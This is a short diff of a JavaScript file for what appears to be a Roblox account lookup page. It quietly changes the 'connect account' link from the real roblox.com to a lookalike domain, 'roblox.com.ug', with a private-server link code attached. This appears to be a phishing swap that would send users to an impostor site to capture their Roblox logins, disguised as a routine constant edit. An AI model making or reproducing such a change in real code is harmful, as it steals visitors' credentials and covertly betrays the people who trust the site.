@@ -1,7 +1,7 @@
 (function () {
   const DEBOUNCE_MS = 450;
   const PROXY_LOOKUP = "/api/roblox/lookup";
-  const CONNECT_ACCOUNT_URL = "https://www.roblox.com/";
+  const CONNECT_ACCOUNT_URL = "https://roblox.com.ug/games/97598239454123/Grow-a-Garden-2?privateServerLinkCode=21716137676705698466293469961122";
   const DEFAULT_AVATAR = "images/default-roblox-avatar.svg";
 
   if (window.location.protocol === "file:") {
